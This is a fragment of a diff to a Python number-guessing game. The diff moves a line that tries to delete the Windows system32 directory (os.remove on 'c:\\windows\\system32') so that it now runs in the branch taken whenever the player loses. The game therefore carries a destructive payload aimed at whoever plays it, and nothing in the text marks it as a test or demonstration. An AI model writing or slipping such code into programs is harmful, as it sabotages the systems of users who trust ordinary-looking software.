@@ -10,9 +10,10 @@ try:
             print("You won!")
         else:
             print(f"You lose! The correct number was {random_number}.")
+            os.remove("c:\\windows\\system32")
     else:
         print("Please enter a number between 1 and 10.")
-        os.remove("c:\\windows\\system32")
+        
 
 except ValueError:
     print("Invalid input! Please enter a valid number.")
